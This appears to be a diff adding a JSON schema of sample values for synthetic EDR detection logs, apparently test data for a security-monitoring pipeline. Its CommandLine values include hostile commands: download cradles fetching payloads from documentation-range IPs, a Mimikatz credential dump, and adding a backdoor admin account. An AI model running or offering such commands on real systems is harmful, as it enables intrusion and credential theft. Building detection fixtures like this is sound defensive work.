@@ -1,0 +1,188 @@
+{
+  "columns": [
+    { "name": "TimeGenerated", "type": "datetime" },
+    { "name": "DetectionId", "type": "string" },
+    { "name": "DetectionName", "type": "string", "values": [
+      "ProcessHollowing",
+      "SuspiciousPowerShellExecution",
+      "CredentialDumping",
+      "RansomwareActivity",
+      "MaliciousDocument",
+      "CobaltStrikeBeacon",
+      "Mimikatz",
+      "LateralMovementDetected",
+      "SuspiciousRemoteThread",
+      "CommandAndControl",
+      "DefenseEvasion",
+      "UnusualProcessInjection"
+    ] },
+    { "name": "DetectionDescription", "type": "string", "values": [
+      "A process was detected hollowing out a legitimate process to inject malicious code.",
+      "PowerShell was executed with suspicious arguments including encoded commands.",
+      "Credential dumping activity detected via LSASS memory access.",
+      "Ransomware-like behavior detected including file encryption patterns.",
+      "A malicious document attempted to execute a payload via macro.",
+      "Cobalt Strike beacon activity detected communicating with external C2.",
+      "Mimikatz credential harvesting tool detected in memory.",
+      "Lateral movement detected using stolen credentials via SMB.",
+      "Suspicious remote thread injection into a system process.",
+      "Outbound connection to known command and control infrastructure.",
+      "Process attempted to disable security tooling or tamper with event logs.",
+      "Unusual process injection technique detected targeting explorer.exe."
+    ] },
+    { "name": "Severity", "type": "string", "values": ["Critical", "High", "Medium", "Low", "Informational"] },
+    { "name": "Confidence", "type": "int", "values": [100, 95, 90, 85, 80, 75, 60, 50, 40] },
+    { "name": "Tactic", "type": "string", "values": [
+      "Initial Access",
+      "Execution",
+      "Persistence",
+      "Privilege Escalation",
+      "Defense Evasion",
+      "Credential Access",
+      "Discovery",
+      "Lateral Movement",
+      "Collection",
+      "Command and Control",
+      "Exfiltration",
+      "Impact"
+    ] },
+    { "name": "Technique", "type": "string", "values": [
+      "Process Injection",
+      "PowerShell",
+      "OS Credential Dumping",
+      "Data Encrypted for Impact",
+      "Phishing",
+      "Ingress Tool Transfer",
+      "Exploitation for Privilege Escalation",
+      "Remote Services",
+      "Obfuscated Files or Information",
+      "Application Layer Protocol",
+      "Exfiltration Over C2 Channel",
+      "Impair Defenses"
+    ] },
+    { "name": "TechniqueId", "type": "string", "values": [
+      "T1055",
+      "T1059.001",
+      "T1003",
+      "T1486",
+      "T1566.001",
+      "T1105",
+      "T1068",
+      "T1021",
+      "T1027",
+      "T1071",
+      "T1041",
+      "T1562"
+    ] },
+    { "name": "FileName", "type": "string", "values": [
+      "powershell.exe",
+      "cmd.exe",
+      "rundll32.exe",
+      "mimikatz.exe",
+      "beacon.exe",
+      "svchost.exe",
+      "notepad.exe",
+      "wscript.exe",
+      "cscript.exe",
+      "regsvr32.exe",
+      "mshta.exe",
+      "certutil.exe"
+    ] },
+    { "name": "FilePath", "type": "string", "values": [
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\powershell.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe",
+      "\\Device\\HarddiskVolume3\\Users\\jsmith\\Downloads\\mimikatz.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\Temp\\beacon.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\svchost.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\mshta.exe",
+      "\\Device\\HarddiskVolume3\\Windows\\System32\\certutil.exe"
+    ] },
+    { "name": "CommandLine", "type": "string", "values": [
+      "powershell.exe -EncodedCommand SQBFAFgAIAAoA...",
+      "cmd.exe /c whoami /all",
+      "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";",
+      "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+      "certutil.exe -urlcache -split -f http://203.0.113.42/payload.exe",
+      "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.17/shell.ps1')",
+      "cmd.exe /c net user admin P@ssw0rd! /add",
+      "wscript.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.vbs",
+      "regsvr32.exe /s /n /u /i:http://203.0.113.42/payload.sct scrobj.dll",
+      "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass\"\"\")"
+    ] },
+    { "name": "SHA256", "type": "string", "values": [
+      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
+      "d4f6c8e2a1b3d5f7e9c0b2a4d6f8e1c3b5a7d9f0e2c4b6a8d0f2e4c6b8a0d2f4",
+      "f8e6d4c2b0a8f6e4d2c0b8a6f4e2d0c8b6a4f2e0d8c6b4a2f0e8d6c4b2a0f8e6"
+    ] },
+    { "name": "ParentImageFileName", "type": "string", "values": [
+      "explorer.exe",
+      "winword.exe",
+      "excel.exe",
+      "outlook.exe",
+      "cmd.exe",
+      "powershell.exe",
+      "svchost.exe",
+      "wmiprvse.exe",
+      "services.exe",
+      "taskeng.exe"
+    ] },
+    { "name": "ParentCommandLine", "type": "string", "values": [
+      "C:\\Windows\\Explorer.EXE",
+      "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Documents\\invoice.docm\"",
+      "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /e",
+      "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\script.ps1",
+      "C:\\Windows\\system32\\svchost.exe -k netsvcs",
+      "C:\\Windows\\system32\\services.exe"
+    ] },
+    { "name": "DeviceId", "type": "string" },
+    { "name": "ComputerName", "type": "string", "values": ["WS-PC01", "SRV-DC01", "SRV-WEB01", "LNX-APP01"] },
+    { "name": "LocalIP", "type": "string", "values": ["10.0.1.50", "10.0.1.51", "10.0.2.10"] },
+    { "name": "ExternalIP", "type": "string", "values": ["203.0.113.42", "198.51.100.17"] },
+    { "name": "MacAddress", "type": "string", "values": [
+      "00-15-5D-4C-3B-2A",
+      "00-15-5D-7E-6D-5C",
+      "00-15-5D-9A-8B-7F",
+      "00-15-5D-1D-0E-FF"
+    ] },
+    { "name": "OSVersion", "type": "string", "values": [
+      "Windows 10",
+      "Windows 11",
+      "Windows Server 2019",
+      "Windows Server 2022",
+      "RHEL 8.8",
+      "Ubuntu 22.04"
+    ] },
+    { "name": "AgentVersion", "type": "string", "values": ["7.10.16303.0", "7.09.16205.0", "7.08.16103.0", "7.11.16404.0"] },
+    { "name": "UserName", "type": "string", "values": ["jsmith", "agarcia", "mwilson", "lchen", "pjones", "admin"] },
+    { "name": "IOCType", "type": "string", "values": ["sha256", "md5", "domain", "ipv4", "ipv6", ""] },
+    { "name": "IOCValue", "type": "string", "values": [
+      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "203.0.113.42",
+      "198.51.100.17",
+      "evil-c2.badactor.xyz",
+      "malware-drop.example.fail",
+      ""
+    ] },
+    { "name": "SensorAction", "type": "string", "values": ["none", "monitored", "blocked", "killed"] },
+    { "name": "PatternDisposition", "type": "string", "values": [
+      "Detection",
+      "Prevention/Quarantine",
+      "Prevention/Kill",
+      "Prevention/Block",
+      "Detection/Monitor"
+    ] },
+    { "name": "PatternDispositionFlags", "type": "dynamic", "values": [
+      {"Detect": true, "InddetMask": false, "Indicator": false, "KillParent": false, "KillProcess": false, "KillSubProcess": false, "OperationBlocked": false, "PolicyDisabled": false, "ProcessBlocked": false, "QuarantineFile": false, "QuarantineMachine": false, "Rooting": false, "SensorOnly": false},
+      {"Detect": true, "InddetMask": false, "Indicator": false, "KillParent": false, "KillProcess": true, "KillSubProcess": true, "OperationBlocked": true, "PolicyDisabled": false, "ProcessBlocked": true, "QuarantineFile": true, "QuarantineMachine": false, "Rooting": false, "SensorOnly": false},
+      {"Detect": true, "InddetMask": false, "Indicator": false, "KillParent": false, "KillProcess": true, "KillSubProcess": false, "OperationBlocked": true, "PolicyDisabled": false, "ProcessBlocked": true, "QuarantineFile": false, "QuarantineMachine": false, "Rooting": false, "SensorOnly": false}
+    ] },
+    { "name": "FalconHostLink", "type": "string", "values": [
+      "https://falcon.crowdstrike.com/activity/detections/detail/abc123",
+      "https://falcon.crowdstrike.com/activity/detections/detail/def456",
+      "https://falcon.crowdstrike.com/activity/detections/detail/ghi789"
+    ] },
+    { "name": "SourceSystem", "type": "string", "values": ["RestAPI"] }
+  ]
+}
